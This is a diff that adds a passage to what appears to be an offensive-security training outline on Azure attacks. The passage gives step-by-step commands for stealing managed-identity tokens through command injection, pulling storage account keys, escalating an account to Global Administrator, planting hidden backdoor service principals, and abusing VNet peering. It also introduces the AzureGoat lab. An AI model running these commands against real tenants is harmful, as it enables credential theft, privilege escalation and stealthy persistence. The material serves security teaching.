@@ -17809,3 +17809,91 @@ Use Different Techniques to Conceal Malicious Programs and Maintain Remote Acces
 					- az network nsg rule list --resource-group <ResourceGroupName> --nsg-name <NSGName> --query "[?direction=='Inbound' && sourceAddressPrefix=='*']" --output table
 					- This command queries NSG rules to identify inbound rules where the source address prefix is set to any IP address (0.0.0.0/0).
 		- By using these methods, security teams can detect and remediate open NSGs, minimizing the risk of unauthorized access and potential attacks in an Azure environment.
+	- Exploiting Managed Identities and Azure Functions:
+		- Attackers can potentially exploit managed identities to authenticate with any service that supports Azure AD authentication without manually managing login details. This allows them to gain unauthorized access to resources, execute malicious code, or exfiltrate sensitive data by impersonating legitimate services.
+		- Attackers can follow these steps to exploit managed identities and Azure Functions:
+			- Command Injection to Obtain an Access Token:
+				- Run the following command to exploit a command injection vulnerability in a web application (Azure Function) and access $IDENTITY_ENDPOINT, obtaining the access token and client ID for Azure authentication: curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H "secret:$IDENTITY_HEADER"
+			- Install Azure PowerShell and Authenticate:
+				- Execute the following commands to install the Azure PowerShell module and authenticate using the obtained access token:
+					Install-Module -Name Az -Repository PSGallery -Force
+					Connect-AzAccount -AccessToken <access_token> -AccountId <client_id>
+			- Enumerate Accessible Resources:
+				- Run this command to list the resources the managed identity has access to: Get-AzResource
+			- Check Storage Account Permissions:
+				- Execute the following command to check if the managed identity has permission to retrieve storage account keys: Get-AzStorageAccountKey -ResourceGroupName "<resource_group>" -AccountName "<account_name>"
+				- If successful, this command returns two storage account keys.
+			- Access the Storage Account:
+				- Use the obtained keys to connect to the storage account through Azure Storage Explorer.
+			- Enumerate Storage Containers:
+				- After connecting, search for available containers in the storage account.
+			- Locate Sensitive Information:
+				- Attackers can explore multiple containers, including those used by the web application. Some containers may contain sensitive data, such as security tokens or confidential files.
+	- Privilege Escalation Using Misconfigured User Accounts in Azure AD:
+		- Below are the steps involved in exploiting misconfigured user accounts in an Azure AD environment.
+			- Step 1:
+				- The attacker identifies a normal user account in Azure AD using tools such as BloodHound or AzureHound.
+			- Step 2:
+				- The attacker installs the Azure AD PowerShell module and logs in using a normal user account by running the following command: Connect-AzureAD
+			- Step 3:
+				- The attacker creates a new key credential for the application and stores it on the local machine using the following commands:
+					$pwd = <password>
+					$path = <thumbprint>
+					Export-PfxCertificate -cert $path -FilePath <path_to_save_.pfx> -Password $pwd
+			- Step 4:
+				- The attacker uploads the self-signed certificate to Azure AD in the certificate section of the registered application.
+			- Step 5:
+				- The attacker authenticates to Azure AD using the newly created certificate and escalates the privileges of the normal user account to Global Administrator by running the following commands:
+					Connect-AzureAD -TenantId <tenant_id> -ApplicationId <app_id> -CertificateThumbPrint <thumbprint>
+					Add-AzureADDirectoryRoleMember -RefObjectId <normal_user_object_ID> -ObjectId <Global_admin_ID>
+			- Step 6:
+				- After successfully escalating privileges, the attacker verifies in Azure AD that the normal user now has the Global Administrator role. With these elevated privileges, the attacker can further exploit the target Azure AD environment.
+		- Note: Steps 3–5 require significant privileges, typically available only to administrators or users with high-level directory management permissions. Without these elevated privileges, the commands will not succeed, making them critical to the privilege escalation process.
+	- Creating Persistent Backdoors in Azure AD Using Service Principals:
+		- The primary goal of creating backdoors using Azure AD roles is to maintain persistent access to an organization's cloud resources while minimizing detection. By exploiting Azure AD roles, attackers can establish long-term access, gain elevated permissions for malicious activities, and evade traditional security mechanisms. To achieve this, they can assign privileged roles to themselves or a controlled user/service principal. Tools such as Azure CLI, PowerShell, and BloodHound can facilitate this process.
+		- Steps to Establish Persistence Using Azure CLI:
+			- Once an attacker has identified and obtained access to a target user account, they can execute the following steps using Azure CLI:
+			- Step 1: Identify the Target Role:
+				- Run the following command to list all available roles in the Azure environment: az role definition list --output table
+				- This helps identify the appropriate role for backdoor creation.
+			- Step 2: Create a New Service Principal:
+				- Execute the following command to generate a new service principal: az ad sp create-for-rbac --name <service-principal-name>
+				- This returns details such as the client ID and secret.
+			- Step 3: Assign a Privileged Role:
+				- Assign a privileged role to the newly created service principal: az role assignment create --assignee <service-principal-id> --role <role-name>
+				- For example, to assign the “Owner” role: az role assignment create --assignee <service-principal-id> --role "Owner"
+			- Step 4: Verify the Role Assignment:
+				- Confirm the role assignment using: az role assignment list --assignee <service-principal-id> --output table
+			- Step 5: Enhance Persistence and Avoid Detection:
+				- To evade detection, use inconspicuous naming conventions such as “ProductionServicePrincipal.” Additionally, assign multiple roles to different service principals and periodically rotate credentials: az ad sp credential reset --name <service-principal-id>
+		- Conclusion: Creating backdoors with Azure AD roles is a sophisticated technique that allows attackers to maintain stealthy, long-term access to cloud environments. By leveraging legitimate roles and permissions, they can remain undetected while retaining control over compromised environments.
+		- Note: These commands require elevated privileges, typically granted by the Directory.ReadWrite.All and RoleManagement.ReadWrite.Directory permissions in Azure AD.
+	- Exploiting VNet Peering Connections (www.microsoft.com):
+		- Virtual Network (VNet) peering in Azure allows seamless connectivity between two or more virtual networks, enabling virtual machines to communicate efficiently. However, attackers can exploit VNet peering to move laterally within a network and gain unauthorized access to critical resources. This can lead to malicious activities such as data exfiltration and persistent access.
+		- Steps Attackers Can Take to Exploit VNet Peering Connections:
+			- Create Unauthorized Peering Connections:
+				- az network vnet peering create -g TargetResourceGroup -n AttackerVnetToTargetVnet --vnet-name AttackerVnet --remote-vnet TargetVnetId --allow-vnet-access
+				- Attackers can establish unauthorized VNet peering to create a network path between an attacker-controlled VNet and a target VNet.
+			- Enable Traffic Forwarding:
+				- az network vnet peering update -g TargetResourceGroup -n AttackerVnetToTargetVnet --vnet-name AttackerVnet --allow-forwarded-traffic true
+				- Once the VNets are peered, attackers can enable traffic forwarding to allow communication between compromised and target VMs.
+			- Use Remote Gateways:
+				- az network vnet peering update -g TargetResourceGroup -n AttackerVnetToTargetVnet --vnet-name AttackerVnet --set useRemoteGateways=true
+				- Attackers can configure the peering connection to use remote gateways, granting access to additional networks or on-premises resources.
+			- Enable Gateway Transit:
+				- az network vnet peering update -g TargetResourceGroup -n AttackerVnetToTargetVnet --vnet-name AttackerVnet --set allowGatewayTransit=true
+				- If the target VNet uses a VPN gateway, attackers can enable gateway transit to route traffic through it, gaining access to external networks.
+			- Delete Legitimate Peerings:
+				- az network vnet peering delete -g TargetResourceGroup -n TargetVnetToAnotherVnet --vnet-name TargetVnet
+				- To disrupt network traffic and reroute it through malicious paths, attackers can remove legitimate peering connections.
+			- Synchronize Peering Connections:
+				- az network vnet peering sync -g TargetResourceGroup -n AttackerVnetToTargetVnet --vnet-name AttackerVnet
+				- Attackers can synchronize changes across peered VNets to ensure their configurations remain enforced.
+		- By manipulating VNet peering settings, attackers can create stealthy communication paths, bypass security controls, and maintain unauthorized access within an Azure environment. Organizations should implement strict access controls, audit network configurations regularly, and monitor for suspicious changes to prevent such exploitation.
+	- AzureGoat – Vulnerable-by-Design Azure Infrastructure (github.com):
+		- AzureGoat is a vulnerable-by-design Azure infrastructure that demonstrates the latest OWASP Top 10 web application security risks (2021) and common misconfigurations in services such as App Functions, CosmosDB, Storage Accounts, Automation, and Identities. The tool allows security professionals and attackers to simulate real-world infrastructure while intentionally incorporating vulnerabilities. It provides multiple privilege escalation paths and follows a black-box testing approach.
+		- Below are various scenarios where attackers can use AzureGoat to practice and refine their attack techniques:
+			- Insecure Direct Object Reference (IDOR): Exploit insecure direct object reference vulnerabilities to gain unauthorized access to user accounts and modify credentials.
+			- Server-Side Request Forgery (SSRF): Execute SSRF attacks to abuse server functionality, enabling unauthorized access to or modification of resources.
+			- Security Misconfiguration: Identify misconfigurations that expose sensitive information in Azure resource groups. Attackers can exploit these weaknesses to retrieve storage container lists and scan for open network ports.
+			- Privilege Escalation: Exploit misconfigurations to escalate privileges and gain ownership of resource groups.
